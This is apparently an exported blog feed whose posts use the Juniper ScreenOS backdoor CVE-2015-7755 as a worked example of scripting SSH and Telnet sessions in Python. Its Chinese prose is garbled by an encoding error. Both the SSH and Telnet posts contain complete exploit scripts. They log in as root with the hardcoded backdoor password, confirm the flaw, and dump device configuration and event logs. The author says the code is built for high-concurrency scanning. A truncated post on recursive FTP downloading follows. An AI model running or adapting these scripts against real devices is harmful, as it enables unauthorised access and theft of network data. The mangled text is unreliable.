data-url="aHR0cDovL3d3dy5pYm0uY29tL2RldmVsb3BlcndvcmtzL2NuL2xpbnV4L2wtY24tcGV4cGVjdDIv">IBMÁöÑÊñáÁ´†<i class="fa fa-external-link-alt"></i></span>‰∏≠ &quot;‰æã 3Ôºössh ÁöÑ‰ΩøÁî®&quot; ÊèêÂà∞ÁöÑÔºåÁõ¥Êé•‰ΩøÁî®spawnÁ±ªÊù•ÂÆûÁé∞Ôºå‰ΩÜÊòØËØ•Á±ªËæÉ‰∏∫Â∫ïÂ±ÇÔºåÈúÄË¶ÅÊàë‰ª¨Ëá™Â∑±Â§ÑÁêÜSSHÁöÑÁôªÂΩïÂèä‰∫§‰∫íÈÄªËæëÔºå‰∏îÂÖ∂‰∏≠expectÂáΩÊï∞ÁöÑpatternÂèÇÊï∞ÈúÄ‰∏∫pexpect.expect‰∏≠ÂÆö‰πâÁöÑÁ±ªÂÆû‰æãÔºåËÄå‰∏çÊòØÁõ¥Êé•‰º†ÂÖ•Â≠óÁ¨¶‰∏≤ÊàñÊ≠£ÂàôË°®ËææÂºèÔºå‰ΩøÁî®Ëµ∑Êù•ËæÉ‰∏∫ÁπÅÁêê„ÄÇ</li></ul><p>ÊúÄÁªàÊâæÂà∞‰∫ÜÂêàÈÄÇÁöÑÁ±ªÂáΩÊï∞ pexpect.pty_spawn.read_nonblocking(size=1, timeout=-1) ÔºåÂÆÉËØªÂèñÊúçÂä°Âô®Á´ØÂèëÊù•ÁöÑÊï∞ÊçÆÔºåÁõ¥Âà∞Êï∞ÊçÆÂ≠óËäÇÊï∞ËææÂà∞sizeÔºåÊàñËÄÖËææÂà∞Ë∂ÖÊó∂Êó∂Èó¥timeout„ÄÇ‰ΩÜÁªàÊ≠¢Â≠óÁ¨¶‰∏≤Â∞±ËøòÈúÄÁî±Êàë‰ª¨Ëá™Â∑±Âà§Êñ≠„ÄÇ</p><h3 id="‰ª£Á†Å">‰ª£Á†Å</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pexpect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pexpect <span class="keyword">import</span> pxssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">22</span>, loginTimeout=<span class="number">10</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        readTimeout=<span class="number">2</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">readUntilTimeout</span><span class="params">()</span>:</span></span><br><span class="line">            errFlag = <span class="literal">False</span></span><br><span class="line">            data = <span class="string">''</span></span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> errFlag:</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    data += ssh.read_nonblocking(</span><br><span class="line">                        size=<span class="number">65536</span>,</span><br><span class="line">                        timeout=readTimeout</span><br><span class="line">                    )</span><br><span class="line">                <span class="keyword">except</span> pexpect.exceptions.ExceptionPexpect <span class="keyword">as</span> err:</span><br><span class="line">                    errFlag = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">        readUntilTimeout()  <span class="comment"># skip verbose strings</span></span><br><span class="line">        toNum = <span class="number">0</span></span><br><span class="line">        ssh.send(cmd + <span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        data = readUntilTimeout()</span><br><span class="line">        ret = data</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'-&gt;'</span> <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="number">-10</span>:]) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            data = readUntilTimeout()</span><br><span class="line">            ret += data</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            ssh.send(<span class="string">'\n'</span>*<span class="number">20</span>)</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    ssh = pxssh.pxssh(timeout=readTimeout)</span><br><span class="line">    ssh.login(</span><br><span class="line">        server=host,</span><br><span class="line">        port=port,</span><br><span class="line">        username=<span class="string">'root'</span>,</span><br><span class="line">        password=<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span>,</span><br><span class="line">        auto_prompt_reset=<span class="literal">False</span>,</span><br><span class="line">        login_timeout=loginTimeout,</span><br><span class="line">    )</span><br><span class="line">    banner = ssh.before</span><br><span class="line">    ssh.sendline(<span class="string">'?'</span>)</span><br><span class="line">    help = ssh.read_nonblocking(size=<span class="number">65536</span>, timeout=readTimeout)</span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure><p>‰ª£Á†ÅËØ¥ÊòéÔºö</p><ul><li>26Ë°åÔºöËøûÁª≠ÂèëÈÄÅÂ§ö‰∏™Ôºå‰∏ÄÊ¨°ÊÄßÂ∞ÜÊúçÂä°Âô®Á´ØÁöÑÂ§ö‰∏™ÁªìÊûúÂàÜÊÆµËé∑ÂèñÂà∞ÂÆ¢Êà∑Á´ØÁöÑÊé•Êî∂ÁºìÂ≠ò‰∏≠ÔºåËøôÊ†∑ÂèØ‰ª•ÂáèÂ∞ë‰∫§‰∫íÔºåÊèêÈ´òÁ®ãÂ∫èÊïàÁéá„ÄÇ</li><li>29Ë°åÔºöÂà§Êñ≠ÊØèÊ¨°ËØªÂèñÁöÑÁºìÂ≠òÂå∫‰∏≠ÁöÑÊï∞ÊçÆÁöÑÂêé10‰∏™Â≠óÁ¨¶‰∏≤‰∏≠ÊòØÂê¶Â≠òÂú® <strong>-&gt;</strong> Â≠óÁ¨¶ÔºåÊù•ËØÜÂà´ÊúÄÂêé‰∏Ä‰∏™ÁªìÊûúÂàÜÊÆµ„ÄÇ</li></ul><p>‰ª£Á†ÅÈÄªËæë‰∏éTelnetÁ®ãÂ∫èÁ±ª‰ºº„ÄÇ</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Security </tag>
            
            <tag> CVE </tag>
            
            <tag> PoC/Exp </tag>
            
            <tag> Vul </tag>
            
            <tag> SSH </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonÂÆûÁé∞ÁªàÁ´Ø‰∫§‰∫í ‚Äî‚Äî ‰ª•JuniperÂêéÈó®CVE-2015-7755‰∏∫‰æãÔºà‰∏ÄÔºâ: TelnetÁØá</title>
      <link href="/tech/shell-interaction-in-python-1-telnet/"/>
      <url>/tech/shell-interaction-in-python-1-telnet/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Shell Interaction in Python #1: Telent</strong></em></li><li>Author: dog2</li></ul><hr /><h3 id="ËÉåÊôØ">ËÉåÊôØ</h3><p>Êàë‰ª¨Â∏∏Â∏∏ÈúÄË¶Å‰ΩøÁî®ÁºñÁ®ãËØ≠Ë®ÄÂÆûÁé∞‰∏éÊüê‰∫õÁªàÁ´Ø‰∫§‰∫íÔºå‰ª•ÂÆûÁé∞‰∫§‰∫íËøáÁ®ãÁöÑÂèØÊéßÊÄß„ÄÇÂÖ∑‰ΩìÂà∞ËøôÁ±ªÊ∂âÂèäÁªàÁ´Ø‰∫§‰∫íÁöÑÊºèÊ¥ûÔºåÂè™ÊúâÁºñÂÜôÂêàÈÄÇÁöÑPoC/ExpÔºåÂπ∂‰∏éÁõÆÊ†áÊúâÊ≠£Á°ÆÁöÑ‰∫§‰∫íÈÄªËæëÔºåÊâçËÉΩËøõË°åÊºèÊ¥ûÈ™åËØÅ„ÄÇ</p><p>ËøôÈáåÔºåÊàë‰ª¨‰ª•JuniperÂêéÈó®ÊºèÊ¥ûCVE-2015-7755‰∏∫‰æãÔºå‰ªãÁªçÂ¶Ç‰Ωï‰ΩøÁî®PythonÁºñÂÜôTelnet‰∫§‰∫íÁ®ãÂ∫èÔºå‰∏î:</p><ul><li>Ë¶ÅÊ±ÇËØ•Á®ãÂ∫èÊòØÂèØ‰ª•Áî®‰∫éÈ´òÂπ∂ÂèëÊâ´ÊèèÁöÑ„ÄÇ</li><li>ÂÆûÁé∞ExpÔºåËé∑ÂèñÁõ∏ÂÖ≥ÊïèÊÑü‰ø°ÊÅØ„ÄÇ</li></ul><p>JuniperÂêéÈó®ÊºèÊ¥ûÁõ∏ÂÖ≥‰ø°ÊÅØÂèØÂèÇËßÅ<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzkwMzIzLmh0bWw=">FreebufÁõ∏ÂÖ≥ÊñáÁ´†<i class="fa fa-external-link-alt"></i></span>„ÄÇÁÆÄËÄåË®Ä‰πãÔºåÂç≥ÂèØ‰ΩøÁî®‰ªªÊÑèÁî®Êà∑ÂêçÂèäÂØÜÁ†Å <strong><em>&lt;&lt;&lt; %s(un='%s') = %u</em></strong> Êù•ÁôªÂΩï‰∏Ä‰∫õJuniper ScreenOSËÆæÂ§áÁöÑTelnetÂèäSShÊúçÂä°„ÄÇ</p><h3 id="ÈöæÁÇπ">ÈöæÁÇπ</h3><h4 id="Ê®°ÂùóÈÄâÊã©">Ê®°ÂùóÈÄâÊã©</h4><p>ÂàùÁâàPoCÁ®ãÂ∫èÊàë‰ΩøÁî®‰∫ÜÁõ∏ÂØπÂ∫ïÂ±ÇÁöÑsocketÊ®°ÂùóÊù•ÁÆÄÂçïÂÆûÁé∞ÔºåÁî®‰∫éÊ£ÄÊµãÂçï‰∏™ÁõÆÊ†áÊ≤°ÊúâÈóÆÈ¢òÔºå‰ΩÜÂú®È´òÂπ∂ÂèëÊâ´ÊèèÁöÑÊó∂ÂÄôÊïàÁéáÊûÅ‰ΩéÔºåÁåúÊµãÊòØI/OÈòªÂ°ûÁöÑÂéüÂõ†„ÄÇ</p><p>ËΩ¨ËÄå‰ΩøÁî®Á≥ªÁªüÂ∫ìÂÜÖÁΩÆÊ®°ÂùótelnetlibÔºö</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L3RlbG5ldGxpYi5odG1s">ÊñáÊ°£<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B5dGhvbi9jcHl0aG9uL2Jsb2IvMi43L0xpYi90ZWxuZXRsaWIucHk=">Ê∫êÁ†Å<i class="fa fa-external-link-alt"></i></span></li></ul><p>‰ΩøÁî®telnetÊ®°ÂùóÂêéÂπ∂ÂèëÊâ´ÊèèÁöÑÊïàÁéáÂ∞±ÈùûÂ∏∏È´ò‰∫ÜÔºåCPUÂèäÂ∏¶ÂÆΩÂç†Áî®ÁéáÈÉΩ‰∏äÂéª‰∫Ü„ÄÇÁÆÄÂçïÁøªÈòÖtelnetlibÁöÑÊ∫êÁ†ÅÔºåÂèëÁé∞ÂÆÉÊòØÊúâI/OÊéßÂà∂ÁöÑ„ÄÇ</p><h4 id="exp">Exp</h4><p>JuniperËÆæÂ§á‰ΩøÁî®getÂëΩ‰ª§Êù•Ëé∑ÂèñËÆæÂ§áÁöÑÂêÑÁ±ª‰ø°ÊÅØÔºåÂèØ‰ª•‰ΩøÁî® <em><strong>get ?</strong></em> Êù•Êü•ÁúãÁõ∏ÂÖ≥ÂëΩ‰ª§ÔºåÂÖ∂‰∏≠ÊúÄÈáçË¶ÅÁöÑÊòØ2‰∏™Ôºö</p><ul><li><em><strong>get tech-support</strong></em> : ÂÆÉÁªºÂêà‰∫ÜÂ§ßÈÉ®ÂàÜgetÂ≠êÂëΩ‰ª§ÁöÑÁªìÊûú„ÄÇ</li><li><em><strong>get event</strong></em> : ÂåÖÂê´‰∫ÜËÆæÂ§áÊó•Âøó„ÄÇ</li></ul><p>‰ΩÜÂ≠òÂú®‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂ¶Ç‰∏ä2‰∏™ÂëΩ‰ª§ËøîÂõûÁöÑÂÖ®ÈÉ®‰ø°ÊÅØÊÄªÈáèÈÄöÂ∏∏ÊØîËæÉÂ§ßÔºå‰∏ÄËà¨&gt;=40KBÔºåËÄåÊúçÂä°Á´Ø‰∏çÊòØ‰∏ÄÊ¨°ÊÄßÂ∞Ü‰ø°ÊÅØÂÖ®ÈÉ®ËæìÂá∫ÁªôÂÆ¢Êà∑Á´ØÁöÑÔºåËÄåÊòØÂàÜÊâπËæìÂá∫Âà∞ÁÆ°ÈÅì‰∏≠ÁöÑÔºåÂÆ¢Êà∑Á´ØÈúÄË¶Å‰∏çÊñ≠Âú∞ÈîÆÂÖ•ÂõûËΩ¶ÔºåÊù•È°∫Â∫èËé∑ÂèñÂêÑ‰∏™‰ø°ÊÅØÂàÜÊÆµ„ÄÇ</p><p>ËøôÂ∞±Ë¶ÅÊ±ÇÁ®ãÂ∫èËÉΩ‰∏çÊñ≠Ëé∑ÂèñÁªìÊûú‰ø°ÊÅØÔºåÂπ∂Ê≠£Á°ÆÂà§Êñ≠ÊúÄÂêé‰∏Ä‰∏™ÂàÜÊÆµ‰ª•ÈÄÇÊó∂ÁªàÊ≠¢„ÄÇ</p><a id="more"></a><h3 id="‰ª£Á†Å">‰ª£Á†Å</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib <span class="keyword">as</span> tl</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(host, port=<span class="number">23</span>, timeout=<span class="number">10</span>, successFlag=<span class="string">'ping other host'</span>, doExp=True)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(cmd, maxTo=<span class="number">3</span>)</span>:</span></span><br><span class="line">        data = <span class="string">'--- more ---'</span></span><br><span class="line">        ret = <span class="string">''</span></span><br><span class="line">        flag = <span class="string">'-&gt;'</span></span><br><span class="line">        <span class="keyword">while</span> <span class="string">'-&gt;'</span> <span class="keyword">in</span> flag:</span><br><span class="line">            flag = telnetConn.read_until(<span class="string">'-&gt;'</span>, timeout=timeout)</span><br><span class="line">        toNum = <span class="number">0</span>  <span class="comment"># the max timeout times</span></span><br><span class="line">        telnetConn.write(cmd)</span><br><span class="line">        <span class="keyword">while</span> (<span class="string">'- more -'</span> <span class="keyword">in</span> data) <span class="keyword">and</span> (toNum &lt; maxTo):</span><br><span class="line">            telnetConn.write(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = telnetConn.read_until(<span class="string">'- more -'</span>, timeout=timeout)</span><br><span class="line">                ret += data</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                toNum += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    telnetConn = tl.Telnet(host=host, port=port, timeout=timeout)</span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'login: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'login'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, ret, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    telnetConn.write(<span class="string">'root'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    ret = telnetConn.read_until(<span class="string">'password: '</span>, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.lower():</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line">    telnetConn.write(<span class="string">"&lt;&lt;&lt; %s(un='%s') = %u"</span> + <span class="string">'\n'</span>)</span><br><span class="line">    banner = telnetConn.read_some()</span><br><span class="line">    telnetConn.write(<span class="string">'?'</span> + <span class="string">'\n'</span>)</span><br><span class="line">    help = telnetConn.read_until(banner, timeout=timeout)</span><br><span class="line">    techsupport = <span class="string">''</span></span><br><span class="line">    event = <span class="string">''</span></span><br><span class="line">    success = successFlag <span class="keyword">in</span> help.lower()</span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">and</span> doExp:</span><br><span class="line">        techsupport = exp(cmd=<span class="string">'get tech-support'</span>)</span><br><span class="line">        event = exp(cmd=<span class="string">'get event'</span>)</span><br><span class="line">    <span class="keyword">return</span> success, banner, help, techsupport, event</span><br></pre></td></tr></table></figure><p>‰ª£Á†ÅËØ¥ÊòéÔºö</p><ul><li>5 - 21Ë°åÔºöÂÆûÁé∞‰∫ÜexpÂáΩÊï∞ÔºåÁî®‰∫éÂú®ÊâßË°åÊüê‰∏™ÂëΩ‰ª§cmdÔºåÂπ∂Ëé∑ÂèñÂÖ®ÈÉ®ÁöÑËøîÂõû‰ø°ÊÅØ„ÄÇÂÖ∂‰∏≠Ôºå <strong>-&gt;</strong> Â≠óÁ¨¶‰∏≤ÊòØjuniperÁöÑshellËæìÂÖ•ÊèêÁ§∫Á¨¶ÔºåÊàë‰ª¨ÈÄöËøáÂà§Êñ≠ÂÆÉÊù•ËøáÊª§Êéâ‰∏ä‰∏ÄÊ¨°ÁöÑÂ§ö‰ΩôËæìÂá∫„ÄÇÂú®ËøûÁª≠Ëé∑ÂèñÁªìÊûúÂàÜÊÆµÁöÑËøáÁ®ã‰∏≠ÔºåËã•Âá∫Áé∞Ë∂ÖÊó∂ÔºåÂàô‰ºöÊúÄÂ§öÂ∞ùËØïmaxToÊ¨°„ÄÇ</li><li>23 - 42Ë°åÔºö‰∏ª‰ª£Á†ÅÈÄªËæëÔºåÁôªÈôÜ‰∫ÜËøúÁ´ØtelnetÔºåÂπ∂ÊâßË°å‰∫Ü?ÂëΩ‰ª§ÔºåÂà§Êñ≠ËøîÂõûÁöÑ‰ø°ÊÅØ‰∏≠ÊòØÂê¶ÂåÖÂê´success_flagÂèòÈáèÂØπÂ∫îÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÈªòËÆ§ÊòØ'ping other host'ÔºåËã•Â≠òÂú®ÂàôÊñ≠ÂÆöÂ≠òÂú®ËØ•ÊºèÊ¥û„ÄÇËã•doExp‰∏∫TrueÔºåÂàôË°®Á§∫ÊâßË°åExpÔºåÂàôÁ®ãÂ∫è‰ºöË∞ÉÁî®exp()ÂáΩÊï∞ÂàÜÂà´ÊâßË°å‰∏äËäÇ‰∏≠ÊèêÂà∞2‰∏™getÂëΩ‰ª§Âπ∂Ëé∑ÂèñÂÖ®ÈÉ®ËøîÂõû‰ø°ÊÅØ„ÄÇ <em><strong>ËøôÈáåÈúÄË¶ÅÁâπÂà´ÊåáÂá∫ÁöÑÊòØÔºåËøîÂõûÁöÑtechsupportÂ≠óÁ¨¶‰∏≤‰∏≠ÂèØËÉΩÂê´ÊúâÂêÑÁßçÁâπÊÆäÁºñÁ†ÅÁöÑÂ≠óÁ¨¶‰∏≤ÔºåÂõ†Ê≠§Ëã•ÈúÄÂØπÂÖ∂ËøõË°åËΩ¨Á†ÅÊìç‰ΩúËØ∑ÂÜç‰∏âËÄÉËôëÔºå‰ª•Èò≤ÊîπÂèòÂéüÂßãÊï∞ÊçÆ</strong></em>„ÄÇ</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Security </tag>
            
            <tag> CVE </tag>
            
            <tag> PoC/Exp </tag>
            
            <tag> Telnet </tag>
            
            <tag> Vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PythonÂÆûÁé∞‰∏ãËΩΩFTPÊúçÂä°Âô®ÁöÑÊï¥‰∏™ÁõÆÂΩïÔºàÊñá‰ª∂Â§πÔºâ</title>
      <link href="/tech/downloading-ftp-directory-recursively-with-python/"/>
      <url>/tech/downloading-ftp-directory-recursively-with-python/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Downloading FTP Directory Recursively with Python</strong></em></li><li>Author: dog2</li></ul><hr /><h3 id="ÈúÄÊ±Ç">ÈúÄÊ±Ç</h3><ul><li>Âø´ÈÄüÊâπÈáè‰∏ãËΩΩÂ§ö‰∏™FTPÊúçÂä°Âô®ÁöÑ‰∏äÁöÑÁõÆÂΩïÔºàÊåáÂÆöÁõÆÂΩïÊàñÊï¥‰∏™ÁõÆÂΩïÔºâ„ÄÇ</li></ul><a id="more"></a><h3 id="ÂàÜÊûê">ÂàÜÊûê</h3><ul><li>Ê†∏ÂøÉÈóÆÈ¢òÔºöÈíàÂØπ‰∏Ä‰∏™FTP ServerÔºåË¶ÅËÉΩÂ§ü‰∏ãËΩΩÂÖ∂ÊåáÂÆöÁõÆÂΩï„ÄÇÂç≥ÈÄíÂΩíÈÅçÂéÜÊâÄÊúâÁõÆÂΩïÔºåÈíàÂØπÊØè‰∏™ÁõÆÂΩï‰∏≠ÁöÑÂ≠êÁõÆÂΩïÔºåÂàõÂª∫Êú¨Âú∞Áõ∏Â∫îÁõÆÂΩïÔºõÈíàÂØπÊØè‰∏™ÁõÆÂΩï‰∏≠ÁöÑÊñá‰ª∂Ôºå‰∏ãËΩΩÂà∞Êú¨Âú∞Áõ∏Â∫îÁõÆÂΩï„ÄÇ</li><li>‰∏ãËΩΩÊâÄÊúâÊñá‰ª∂ÁöÑËøáÁ®ãÊúÄÂ•Ω‰πüÊòØÂèØÂπ∂ÂèëÁöÑÔºå‰ª•Âä†Âø´Êï¥‰∏™‰∏ãËΩΩËøáÁ®ã„ÄÇ</li></ul><h3 id="ÂâçËΩ¶‰πãËΩÆ">ÂâçËΩ¶‰πãËΩÆ</h3><p>ÈúÄÊ±ÇÂèäÂÆûÁé∞ÊÄùË∑ØÂ∑≤ÁªèÊ∏ÖÊ•öÔºåÂâ©‰∏ãÁöÑÂ∞±ÊòØÁºñÁ†ÅÊµãËØï‰∫Ü„ÄÇ</p><p>ÊåâÁÖßÊÉØ‰æãÔºå‰∏∫ÈÅøÂÖçÈáçÂ§çÈÄ†ËΩÆÂ≠êÔºåÂú®ÂºÄÂ∑•ÂâçÊúâÂøÖË¶Å‰∏äË∞∑Ê≠åÁôæÂ∫¶‰∏Ä‰∏ãÔºåÁ°ÆÂÆöÂâç‰∫∫ÊòØÂê¶Â∑≤ÁªèÈÄ†Âá∫‰∫ÜÂ•ΩÁî®ÁöÑËΩÆÂ≠ê„ÄÇ ÊâæÂà∞Â¶Ç‰∏ãÂá†‰∏™Ôºö</p><ol type="1"><li><span class="exturl" data-url="aHR0cDovL3d3dy5qYjUxLm5ldC9hcnRpY2xlLzMzOTg2Lmh0bQ==">ÈÄöËøápython‰∏ãËΩΩFTP‰∏äÁöÑÊñá‰ª∂Â§πÁöÑÂÆûÁé∞‰ª£Á†Å<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL2Nhbmx5bmV0Lml0ZXllLmNvbS9ibG9nLzgzNjk5Ng==">pythonÂÆûÁé∞ÁöÑftpËá™Âä®‰∏ä‰º†‰∏ãËΩΩÁ®ãÂ∫èÔºàÊîØÊåÅÁõÆÂΩïÈÄíÂΩíÊìç‰ΩúÔºâ<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cDovL3d3dy5qYjUxLm5ldC9hcnRpY2xlLzY3MTk2Lmh0bQ==">pythonÂÆûÁé∞ÊîØÊåÅÁõÆÂΩïFTP‰∏ä‰º†‰∏ãËΩΩÊñá‰ª∂ÁöÑÊñπÊ≥ï<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9mdHB1dGlsLzMuMg==">pythonÁ¨¨‰∏âÊñπÂ∫ì ftputil<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS9weWZ0cHN5bmMvMS4wLjM=">pythonÁ¨¨‰∏âÊñπÂ∫ì pyftpsync<i class="fa fa-external-link-alt"></i></span></li></ol><p>ÈÄê‰∏ÄÊµãËØïÔºåÈÉΩ‰∏çÂ§™Â•ΩÁî®„ÄÇ</p><p>1Âú®Áé∞ÂÆûÊó∂‰ΩøÁî®os.chdirÂàáÊç¢Êú¨Âú∞‰∏ãËΩΩÁõÆÂΩïÔºåÊâπÈáè‰∏ãËΩΩÔºàÂ§öÁ∫øÁ®ãÂπ∂Âèë‰∏ãËΩΩÂ§ö‰∏™ÊúçÂä°Âô®ÁõÆÂΩïÔºâÊó∂‰ºö‰∫ßÁîüÁõÆÂΩïÊ∑∑‰π±„ÄÇ</p><p>3Âú®‰∏ãËΩΩÊØè‰∏™Êñá‰ª∂ÈÉΩÈúÄË¶ÅÊâßË°ålsÂáΩÊï∞Á°ÆËÆ§ÂÖ∂Â≠òÂú®‰∫éËøúÁ®ãÁõÆÂΩïÔºåÊÄßËÉΩÂæà‰Ωé„ÄÇ</p><p>‰ΩøÁî®2 4 5Ê≤°ÊúâÊàêÂäü‰∏ãËΩΩËøáÔºåÂèØËÉΩÊòØÁî®Ê≥ï‰∏çÂØπÔºåÁ≤óÁï•Êâ´‰∫Ü‰∏ãÊñáÊ°£ÂíåÊ∫êÁ†ÅÔºå‰πüÊ≤°ÊâæÂà∞Ê≠£Á°ÆÁî®Ê≥ï„ÄÇÂ¶ÇÊûú‰Ω†Áü•ÈÅìÊ≠£Á°ÆÁî®Ê≥ïÔºåËøòËØ∑ÊåáÁÇπ„ÄÇ</p><h3 id="ÂÆûÁé∞">ÂÆûÁé∞</h3><p>Êó¢ÁÑ∂Ââç‰∫∫ÁöÑËΩÆÂ≠êÈÉΩ‰∏çÂ§™Â•ΩÁî®ÔºåÂè™Â•ΩÂÜçÈÄ†‰∏Ä‰∏™„ÄÇÁõ∏ÂØπÂÖ∂‰ªñÂçèËÆÆËÄåË®ÄÔºåFTPÂçèËÆÆËøòÊòØÊØîËæÉÂ§çÊùÇÁöÑÔºåÂõ†Ê≠§ÊúÄÂ•ΩÂü∫‰∫éÂ∑≤ÊúâÁöÑFTPÂ∫ìÊù•ÂÆûÁé∞ÔºåpythonÁöÑËá™Â∏¶FTPÂ∫ìÊòØftplibÔºåËøôÈáåÂ∞±ÈÄâÁî®ÂÆÉ„ÄÇ</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvMi9saWJyYXJ5L2Z0cGxpYi5odG1s">ÊñáÊ°£<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" 